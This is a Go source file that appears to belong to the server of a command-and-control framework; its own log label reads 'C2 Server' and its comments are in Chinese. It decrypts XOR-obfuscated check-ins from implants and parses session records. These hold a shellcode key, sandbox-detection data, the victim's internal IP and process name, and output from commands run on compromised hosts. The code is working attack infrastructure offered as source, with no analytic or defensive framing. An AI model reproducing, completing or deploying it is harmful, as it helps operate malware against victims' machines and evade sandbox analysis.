package SessionController

import (
	"Server/Public"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"github.com/gin-gonic/gin"
	"golang.org/x/text/encoding/simplifiedchinese"
	"io"
	"time"
)

// 解密会话数据
func DecryptSessionData(c *gin.Context) (map[string]interface{}, []interface{}, []interface{}, bool) {
	sessionData, err := io.ReadAll(c.Request.Body)
	if err != nil {
		WriteSystemLogInfo("C2 Server", "以空数据访问监听器: "+c.ClientIP(), "Alarm")
		return nil, nil, nil, true
	}
	sessionData = DecryptData(sessionData)[:len(sessionData)-1]

	// 解析会话数据
	// 待定会话信息: SID\0Tag\0 + ShellCode密钥 + 沙箱检测数据
	/*
		正式上线会话数据:
		{会话信息: {内网IP: xxx, 进程名: xxx, ...},
		自定义汇编哈希列表: [{哈希值: xxx}, ...],
		命令输出数据列表: [{命令ID: xxx, 输出数据Hex: xxx, paraHex:}, ...]}
	*/
	sessionDataMap := make(map[string]interface{})
	err = json.Unmarshal(sessionData, &sessionDataMap)
	// 待定会话
	if err != nil {
		sessionInfoMap := ParsePendingSessionInfo(sessionData)
		if sessionInfoMap != nil {
			return sessionInfoMap, nil, nil, false
		}
		WriteSystemLogInfo("C2 Server", "以无法解析的数据访问监听器: "+c.ClientIP(), "Alarm")
		return nil, nil, nil, true
	}
	// 正式上线会话
	sessionInfoMap := sessionDataMap["sessionInfo"].(map[string]interface{})
	selfAsmHashList := sessionDataMap["selfAsmHashList"].([]interface{})
	commandOutputDataList := sessionDataMap["commandOutputDataList"].([]interface{})
	return sessionInfoMap, selfAsmHashList, commandOutputDataList, false
}

// 解析待定会话信息
func ParsePendingSessionInfo(sessionData []byte) map[string]interface{} {
	splitIndex1 := bytes.Index(sessionData, []byte{0x00})
	sessionData[splitIndex1] = byte(0x01)
	splitIndex2 := bytes.Index(sessionData, []byte{0x00})
	sessionInfoMap := make(map[string]interface{})
	sessionInfoMap["sessionType"] = "pending"
	sessionInfoMap["sid"] = string(sessionData[:splitIndex1])
	tag, err := simplifiedchinese.GBK.NewDecoder().Bytes(sessionData[splitIndex1+1 : splitIndex2])
	if err != nil {
		tag = []byte("Unable to GBK decode.")
	}
	sessionInfoMap["tag"] = string(tag)
	sessionInfoMap["shellcodeKey"] = string(sessionData[splitIndex2+1 : splitIndex2+1+2])
	sessionInfoMap["determineData"] = base64.StdEncoding.EncodeToString(sessionData[splitIndex2+1+2+1:])
	return sessionInfoMap
}

// 加密数据
func EncryptData(data []byte) []byte {
	dataLength := len(data)
	for i := 0; i < dataLength-1; i++ {
		data[i] ^= data[dataLength-1]
	}
	return data
}

// 解密数据
func DecryptData(data []byte) []byte {
	dataLength := len(data)
	for i := 0; i < dataLength-1; i++ {
		data[i] ^= data[dataLength-1]
	}
	return data
}

// 写入系统日志 (避免依赖冲突)
func WriteSystemLogInfo(username, content string, dataType string) {
	currentTime := time.Now().Format("2006.01.02 15:04:05")
	Public.AddNewData(dataType, username, content+" "+currentTime)
	Public.SqlExec("insert into SystemLogInfo (username, content, time) values (?, ?, ?)", username, content, currentTime)
}
